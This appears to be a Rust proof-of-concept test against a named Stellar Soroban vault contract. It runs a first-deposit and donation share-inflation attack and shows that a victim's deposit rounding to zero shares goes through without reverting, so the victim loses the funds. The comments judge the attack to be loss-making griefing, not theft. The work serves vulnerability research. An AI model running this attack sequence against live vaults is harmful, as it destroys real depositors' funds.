#![no_std]
soroban_sdk::contractimport!(file = "src/vault.wasm");

// PoC: xBull Blend-vault (0fb61144) first-deposit / donation share-inflation.
// Result on real bytecode: NOT profitable theft. Two confirmed facts:
//   (1) deposit that rounds to 0 shares does NOT revert -> depositor silently loses funds
//   (2) an idle donation inflates total_assets, but idle funds are UNEXTRACTABLE
//       (redeem & withdraw pay only from strategy-withdrawals -> 0 with no strategy),
//       so the attacker nets a large LOSS to grief a small victim loss. Griefing, not theft.
#[cfg(test)]
mod test {
    extern crate std;
    use std::println;
    use soroban_sdk::{Env, Address, Vec, testutils::{Address as _, Ledger as _}, token};
    use super::*;

    fn setup() -> (Env, Client<'static>, token::TokenClient<'static>, token::TokenClient<'static>, token::StellarAssetClient<'static>) {
        let env = Env::default();
        env.mock_all_auths_allowing_non_root_auth();
        env.cost_estimate().budget().reset_unlimited();
        env.ledger().set_timestamp(1_000_000);
        let admin = Address::generate(&env);
        let under = env.register_stellar_asset_contract_v2(admin.clone()).address();
        let share = env.register_stellar_asset_contract_v2(admin.clone()).address();
        let targets: Vec<(Address, u128)> = Vec::new(&env);
        let vault = env.register(WASM, (admin.clone(), under.clone(), share.clone(),
            1u128, 1u128, targets, Address::generate(&env), Address::generate(&env), 0u128));
        let c = Client::new(&env, &vault);
        let ut = token::TokenClient::new(&env, &under); let st = token::TokenClient::new(&env, &share); let um = token::StellarAssetClient::new(&env, &under); (env, c, ut, st, um)
    }

    #[test]
    fn first_deposit_inflation_is_griefing_not_theft() {
        let (env, vault, ut, st, um) = setup();
        let atk = Address::generate(&env);
        let vic = Address::generate(&env);
        um.mint(&atk, &1_000_000_000_000_000i128);
        um.mint(&vic, &1_000_000_000_000_000i128);
        let atk0 = ut.balance(&atk);

        vault.deposit(&1i128, &atk, &atk, &atk);                       // attacker first depositor -> 1 share
        ut.transfer(&atk, &vault.address, &1_000_000_000i128);         // inflate via idle donation
        let vb = ut.balance(&vic);
        vault.deposit(&1_000_000i128, &vic, &vic, &vic);               // victim -> 0 shares (NO revert), loses funds
        let victim_loss = vb - ut.balance(&vic);
        println!("[state] total_assets={} total_supply={} idle={} victim_shares={} victim_loss={}",
            vault.total_assets(), vault.total_supply(), ut.balance(&vault.address), st.balance(&vic), victim_loss);

        // attacker tries to extract the inflated pool
        let mw = vault.max_withdraw(&atk);
        let ab = ut.balance(&atk);
        vault.withdraw(&mw, &atk, &atk, &atk);
        let atk_pnl = ut.balance(&atk) - atk0;
        println!("[extract] max_withdraw={} withdrew={} attacker_PnL={} residual_shares={}",
            mw, ut.balance(&atk) - ab, atk_pnl, st.balance(&atk));

        // (1) 0-share deposit defect confirmed; (2) attacker loses money -> griefing, not theft
        assert!(victim_loss > 0 && st.balance(&vic) == 0, "expected 0-share deposit to take funds");
        assert!(atk_pnl < 0, "expected attacker net LOSS (idle unextractable), got {}", atk_pnl);
        println!("[VERDICT] NOT profitable theft. Griefing-at-a-loss (attacker_PnL={}). \
                  Real low-sev defect: deposit rounding to 0 shares does not revert (victim lost {}).",
            atk_pnl, victim_loss);
    }
}
